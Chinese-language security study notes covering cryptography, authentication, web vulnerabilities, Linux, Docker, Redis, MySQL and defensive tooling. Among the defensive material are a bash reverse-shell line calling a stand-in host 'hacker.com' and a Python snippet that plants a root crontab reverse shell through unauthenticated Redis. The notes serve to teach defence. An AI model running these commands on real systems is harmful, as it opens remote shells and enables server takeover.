Security Offense
================
[Hack101 CTF](https://ctf.hacker101.com/ctf) 

* 安全基础
```
任何应用最本质的东西其实都是数据,用户使用产品的过程就是在和企业进行数据交换的过程.
安全的本质就是保护数据被合法的使用

安全原则:(CIA)
  1. 机密性(Confidentiality)原则(数据-不可见)
    - 确保数据只被授权的主体访问，不被任何未授权的主体访问
    - 数据的存储、传输和处理过程需要受到应有的保护(加密、隔离、混淆、隐藏)
  2. 完整性(Integrity)原则(数据-不可改)
    - 确保数据只被授权的主体进行授权的修改
  3. 可用性(Availability)原则(数据-可读)
    - 确保数据能够被授权的主体访问到
    - DoS(Denial of Service, 拒绝服务) 

黄金法则:
  1. 识别(Identification)
    - 身份识别强调是主体如何声明自己的身份
  2. 认证(Authentication) 
    - 主体如何证明自己所声明的身份是合法的
      - 你知道什么(密码，密保问题)
      - 你拥有什么(门禁卡，安全令牌)
      - 你是什么(神物特征,指纹，人脸，虹膜)
  3. 授权(Authorization)
    - 
  4. 审计(Audit)
    - 通过日志还原用户的操作历史
  5. 问责(Accounting)
    - 通过日志的完整性，确保日志还原出来的操作是否可信
  大部分情况下，事前防御属于认证，事中防御属于授权，事后防御属于审计
  用户在使用应用过程中的声明周期:先进行登陆、在进行操作、最后留下记录

密码学是“黄金法则”的基础技术支撑
  密钥：yue
  密码学算法:
    1. 对称加密算法 (推荐使用AES-CTR)
      - 对称加密，代表加密和解密使用的是同一个密钥
      - DES: Data Encryption Standard (数据加密标准) - 密钥长度56位
      - IDEA:(International Data Encryption Algorithm) 国际数据加密算法 密钥长度128位
      - AES:(高级加密标准Advanced Encryption Standar) - 密钥长度 128，192， 256 三种密钥长度
      - 再选取加密算法的时候 存在不同的分组计算模式 ECB/CBC/CFB/OFB/CTR 
    2. 非对称加密算法(ECC)
      - 发送方使用公钥对信息进行加密，接收方收到密文后，使用私钥进行揭秘
      - 非对称密钥只要解决密钥分发的问题
      - 签名功能: 私钥加密 共钥解密 
      - 所有的非对称加密算法都是基于各种数学难题设计，正向计算很容易，反向推到无解
      - RSA:(RSA Algorithm):    
        - RSA的数学难题是两个大质数p,q相乘的结果n很容易计算，但是根据n去做质因数分解得到p,q需要很大的计算量; 主要的优势就是性能比较快，想获得较高的加密强度，需要使用很长的密钥
      - ECC(Elliptic Curve Cryptography) 椭圆加密算法: ECC是目前国际上机密强度最高的非对称加密算法
    3. 散列算法:(SHA-256+Salt)
      - 散列算法并不是为了满足加密需求，而是利用可以对任意长度的输入，计算出定长的ID
      - 不可逆性：
      - 鲁棒性：同样的消息生成同样的摘要
      - 唯一性:不存在两个不同的消息生成同样的摘要
      - MD5:(消息摘要算法 Message-Digest Algorithm 5) - 128位的消息摘要 
      - SHA:(安全散列算法 Secure Hash Algorithm) - SHA-256普遍认为是相对安全的散列算法
      - 使用散列表算法的时候，注意要加盐Salt 

身份认证:
  1. 对外认证: 是单一场景下的认证
    - 应用的登录注册模块 
  2. 对内认证: 多场景下的认证
    - 服务器的登陆，数据库的登陆，Git登陆，内部管理后台的登陆

  身份认证面临的威胁: 无认证、弱密码、认证信息泄漏
    重放攻击: 黑客窃取到身份凭证 (Cookie, Session ID)之后就可以在无密码的情况下完成认证
    1. 对密码的强度进行限制(字母、数字、特殊字符组合密码并达到一定长度)
    2. 强制用户定期修改密码

  单点登录: Single Sign ON, SOO: 
    1. CAS(Central Authentication Service 集中式认证服务)
      1.1: 用户访问应用
      1.2: 应用将用户重定向至认证中心
      1.3: 用户进行认证 
      1.4: 返回认证凭证和相关信息 
      1.5: 将凭证信息发送给应用
      1.6: 应用向认证中心验证有效性
      1.7: 完成认证
    2. JWT:(JSON Web Token): JWT 不需要应用服务端额外维护Cookie或者Session 
    3. OAuth:(Open Autheorization): 
    4. OpenID(Open Identity Document) OAuth 的功能基本一致 


访问控制:
  1. DAC:Discretionary Access Control (自主访问控制)
    - DAC就是让客体的所有者来定义访问控制规则
  2. role-BAC(role Based Access Control)基于角色的访问控制
    - 将主体划分为不同的角色，然后对每个角色的权限进行定义
  3. rule-BAC(rule Based Access Control)基于规则的访问控制
  4. MAC(Mandatory Access Control 强制访问控制)
    - MAC是安全性最高的访问控制策略

威胁评估:
  1. 识别数据: 数据的CIA收到影响会对公司造成多大的损失
  2. 识别攻击: 明确是么样的数据有价值被攻击 
  3. 识别漏洞
```

* Web安全 
```
HTTP & RPC 
XSS攻击: Cross-Site Scripting 跨站脚本攻击
  1. 反射型XSS
  2. DOM的XSS 
  3. 持久型XSS 
    - 窃取Cookie
    - 未授权操作
    - 按键记录和钓鱼
防护XSS：
  1. 验证输入OR验证输出 
  2. 编码
  3. 检测和过滤
CSP: Content Security Policy 内容安全策略

SQL注入:
  1. 修改WHERE语句
  2. 执行任意语句 
  - 通过更改SQL语义来执行黑客设定的SQL语句
  - SQL注入可以绕过验证
  - 任意篡改数据
  - 黑客利用UNION关键词，将SQL语句拼接成下面这行代码直接获取全部的用户信息
  SQL注入攻击，黑客可以绕过验证登陆后台，非法篡改数据库中的数据还能执行任意的SQL语句
防护SQL注入:
  -PreparedStatement: 
    - 数据库处理SQL命令分为两步骤:
      - 1. 将SQL语句解析成数据库可使用的指令集
      - 2. 将变量带入指令集，开始实施执行
  - 使用存储过程 
    - 原理都是将SQL语句的解析和执行过程分开,实现防护
    - 存储过程防注入是将解析SQL的过程，由数据库驱动转移到数据库本身
  - 验证输入:

CSRF(Cross-Site Request Forgery: 跨站请求伪造)攻击:
  - 通过自动提交表单的形式发起攻击
  - CSRF是黑客利用浏览器存储用户Cookie这一特性，模拟用户发起一次带有认证信息的请求
CSRF防护:
  - CSRFToken:是每次用户正常访问页面时，服务端随机生成返回给浏览器
  - 二次验证加强防护: 

SSRF(Server Side Request Forgery服务端请求伪造): 
  - 内网探测: 尝试不同的IP和端口号能够探测整个内网的结构
  - file://直接读取本地文件 
SSRF 防护:
  - 白名单限制: 
  - 协议和资源限制: 
反序列化漏洞:
  序列化: 将对象转化成字符串或者字节流
  反序列化: 将字符串或者字节流变成对象
反序列化漏洞:黑客可以调用到Runtime.exec() 进行命令执行，
JSON: 跨平台数据交换格式:
  1. 认证和签名 
  2. 限制序列化和反序列化
  3. RASP(Runtime Application Self-Protection 实时程序自悟保护)检测:

信息泄漏:
  避免错误信息泄漏代码逻辑
  黑盒Black Box Testing 功能测试 
  百盒White Box Testing 结构测试: 
  对GitHub巡检(Hawkeye) 定期检索公司代码的关键字

Zero Day:
  黑客知道未公开漏洞 
  1. 整理插件，剔除无用插件 
  2. 管理插件补丁更新
  3. 使用公开漏洞库 
    
权限提升:Privilege Escalation 
  1. 窃取身份： 
  2. 后门：
    bash -i >& /dev/tcp/hacker.com/8080 0>&1 
# 服务器通过TCP获取8080段喽返回的命令并执行
Trojan木马: 
  外表正常，但会对应用和系统进行破坏的服务和进程 
  定时任务crontab, 开机启动项inittab, rc.local 
  持久化是通过定时任务和开机启动等方式实现，要么就是通过系统的常驻进程来实现

IDS(Intrusion Detection Ststem 入侵检测系统)
```

* Linux系统和应用安全 
```
Linux 安全模型:
  1. 内核层 
    1.1: 权限划分 
    1.2: 进程隔离 
    1.3: 内存保护
  2. 用户层

Linux系统安全防护的核心是正确的配置用户层权限
  1. Linux中认证机制
    Linux系统是一个支持多用户额的操作系统，通过普通的文本文件保存和管理用户信息
      - /etc/passwd - 全局可读,不具备保密性
      - /etc/shadow - 仅ROOT可读的/etc/shadow中加密后的密码、密码有效天数、失效多少天告警 密码管理策略
  2. Linux中的授权机制:
    - 文件：
      - 读 - 可以读取文件内容 
      - 写 - 可以修改文件内容 
      - 执行 - 可以执行文件 
    - 目录:
      - 读 - 可以读取目录列表 
      - 写 - 可以修改目录列表
      - 执行 - 可以进入目录
    $ chmod +t /tmp 组织删除/tmp目录下其他用户的文件

Mysqld 启动MySQL服务，mysqld会将MySQL进程分配到mysql这个用户并在ROOT下建立守护进程

内网-分区和隔离:
  1. 分区 
    VLAN - Virtual Local Area Network 虚拟局域网
  2. 隔离 
    通过路由器划分内网和外网
    通过交换机划分
  无线网络安全:
    1. 无线网络中个人设备是通过射频技术和无线热点进行连接，射频无法定向接收，因此数据都是"广播"出去，
      WPA2 - 无线网络协议 
    2. 认证技术: 强制门户
    2.劫持
      伪造热点 
    网络协议：目标地址主要通过MAC地址和IP地址确定
      MAC地址： ARP协议 
      DNS协议：IP地址
DDoS攻击:(DIstributed Denial Of Service Attacj分布式拒绝服务攻击)
  黑客由外网想公司服务发起大量的请求，打满网络带宽,让内网无法响应用户的正常请求

DoS(Denail Of Service 拒绝服务)攻击 

各类云服务厂商提供的DDoS解决方案都是依靠带宽扩容进行保障

Docker 服务: Docker 提供的功能以及宿主机Linux中的Docker进程 
  Namespace 机制: Linux会对不同的Namespace之间的进程做隔离，避免不同的进程之间相互产生影响
    -部分没有被Namespace隔离开的目录和模块
      1. 进程/proc/ 
      2. 内存映像 /dev/mem 
      3. 系统设备 /dev/sd* 
      4. Linux内核模块
  Capabilities 机制 
      对容器可以进行的操作进行限制
  CGroups机制:
    Docker服务可以利用CGroups机制实现对容器中内存、CPU、IO限制 
Docker 镜像: 通过Dockerfile构建出的Docker镜像
  - 使用最精简的镜像 (精简版的Docker镜像都带有Slim或者alpine)
    - 精简版的基础镜像可以去除大部分无用的系统功能和依赖库
  - 最小权限原则
    - 默认情况下，容器内的进程都是以ROOT权限启动；可以使用USER关键字，使用一个低权限的用户运行服务
    - # 创建一个用户没有密码和Home目录和shell 
    - $ groupadd -r user && useradd -r -s /bin/false -g user user 
Docker 容器: 运行的Docker容器
Docker Daemon: 守护进程(2375端口)
  守护进程提供的API接口是为了方便用户去做一些自动化工具，操作Docker容器
  
Redis 数据库安全:
  - Redis 高性能的KV结构数据库 
  如何让Redis执行命令
  r = redis.Redis(host=10.0.0.1, port=6379, db=0, socket_timeout=10)
  payload = '\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/127.0.0.1/8080 0>&1\n\n'
  path = '/var/spool/cron'
  name = 'root'
  key = 'payload'
  r.set(key, payload)
  r.config_set('dir', path)  # Redis CONFIG命令 将Redis数据持久化目录修改为/var/spool/cron 
  r.config_set('dbfilename', name)
  r.save()  # Redis Save命令发起Redis数据持久化功能
  r.delete(key) 
  r.config_set('dir', '/tmp')

Redis 为高性能设计，Redis默认不配置密码
Redis本身不提供授权机制，但是可以通过"重命名"间接实现授权功能,可以在Redis配置文件中加入rename-command CONFIG XX 将CONFIG功能的关键词变成一个随机字符串
Redis是一个极度看重性能的数据库，为了性能舍弃部分的安全功能，可以通过“增加密码”“使用最小权限原则”“授权”方式，在一定程度上提升Redis的安全性

MySql:
  LOAD DATA INFILE: MySQL可以读取服务器的本地文件 
  SELECT INTO DUMPFILE:MySQL可以将数据写入到本地文件中
  MySQL提供多用户的认证体系，将用户的相关信息(认证信息，权限信息)都存储在mysql.user这个系统表中
  GRANT: 授权
    GRANT ALL PRIVILEGES  ON db.table TO user@'127.0.0.1' IDENTIFIED BY 'password'
  McAfee提供mysql-audit 插件自动收集MySQL操作信息，推送ELK集群中进行持续的审计操作
  MySQL提供传输过程中的SSL(Security Socket Layer)加密，也提供存储过程中硬盘加密 

Hadoop: 
  分布式框架
  HDFS：提供大数据存储的文件系统支持 
  YARN：提供大数据运算的资源调度能力 
  MapReduce:计算框架 
  - 支持基于Kerberos协议的认证功能，（适用于服务与服务之间的认证）
  - Hadoop支持对硬盘数据进行加密存储 
  - Hadoop提供一个密钥管理中心KMS
  - Apache Knox: 针对Hadoop集群的网关
  - Apache Sentry: 相当于Hadoop提供集中式授权中心
  - Apache Ranger提供一个集中制的访问控制机制 
```

* 安全防御工具
```
等级安全保障:
  1. 技术要求: 
    - 安全物理环境
    - 安全通信网络 
    - 安全区域边界
    - 安全计算环境
    - 安全管理中心
  2. 管理要求:
    - 安全管理制度 
    - 安全管理结构 
    - 安全管理人员 
    - 安全建设管理 
    - 安全运维管理

防火墙：
  防火墙是部署在网络边界上的一种安全设备, 
  1. 包过滤防火墙 
    - 包过滤防火墙工作在网络层和传输层(网络请求在TCP或者UDP数据包形式流动)
      - 源IP和端口，目标IP和端口，协议号
  2. 应用网关防火墙 
    - 应用网关防火墙以代理的模式工作在应用层，接受客户端发出的请求，然后以客户端的身份将请求发往服务端
      - 内容监控，认证，协议限制甚至缓存
      - 需要对TCP，UDO包进行解析，处理成应用层的数据协议
      - 在应用网关防火墙中，服务端看到的请求都来自于代理，会导致服务端无法有效的追踪请求的来源
  3. 状态检测防火墙
    状态检测防火墙是包过滤防火墙的一种升级，工作在网络层和传输层之上,
    状态检测防火墙会尝试将一连串的数据包组成一次完整的连接请求，从而获得一个更全面 大大提高安全性

1. 保护操作系统的漏洞 
2. 组织非法的信息流动
3. 限制可访问的服务和审计 

WAF Web Application Firewall, Web 应用返沪系统 
  Web安全关注于应用层HTTP请求 
  三种工作模式:
    1. 透明代理
      - 只能够控制请求的通过或者拒绝
    2. 反向代理
      - 要求客户端将请求的目标地址指向WAF，而不是服务端
    3. 插件模式 
      - AOP: Aspect Oriented Programming, 面向切面编程
  1. HTTP解析能力:
  
  签名匹配
  正则匹配

IDS(Intrusion Detection System 入侵检测系统):
  IDS最终目的是检测黑客的攻击行为
  1. NIDS(Network Intrusion Detection System 网络入侵检测系统)
    - NIDS主要检测网络流量中的攻击行为
    - 在使用NIDS的时候注意及时对规则进行维护即可
  2. HIDS(Host-based Intrustion Detection System 基于主机型入侵检测系统)
    - HIDS主要检测服务器系统中的攻击行为
    - HIDS运行在每个服务器中，相当于对系统行为进行分布式检测
    - Osquery：提供信息采集功能满足大部分的HIDS需求
  3. IPS:(Intrusion Prevention System, 入侵防御系统)

蜜罐:
  1. 低交互蜜罐 
    - 低交互蜜罐：所有的服务都是模拟的，不能提供真实的服务功能
  2. 高交互蜜罐 
    - 高交互蜜罐会提供一个真实的服务，而且不施加任何限制，只是用来做详细的记录而已

Kafka + ES: 
  
RASP: Runtime Application Self Protection: 

建立一个安全体系很简单，运营好一个安全体系很复杂
SIEM(Security Information and Event Management 安全信息和事件管理):
  
大数据分析:
  Garbage In, Garbage Out. 

SDL: Security Development Lifecycle 安全开发声明周期
  DLC: Softwre Development Life Cycle: 软件开发周期 
    1. 需求分析 
    2. 设计 
    3. 开发 
    4. 测试 
    5. 部署
  SDL执行流程:
    1. 安全培训 
      - 培训内容包括安全概念和框架，威胁评估，Web安全，安全测试以及隐私保护
    2. 需求分析 
      - 安全标准: 需要对敏感数据进行加密存储，需要进行二次认证
      - 安全指标: 在上线时，软件必须经过安全测试，却不允许存在任何高危漏洞
      - 风险点评估: 
    3. 设计 
      - 需要对安全和开发成本进行平衡考量，使得最终的安全设计方案能够被所有项目人员认可
    4. 开发 
      - 限制开发人员使用工具和方法
    5. 测试 
      - 在测试阶段，测试人员会对软件的功能进行测试，安全人员需要对软件的安全性进行测试
    6. 部署 
      - 归档，代码、需求列表、设计方案和应急预案在内所有的内容都不允许改动
    7. 响应 
```
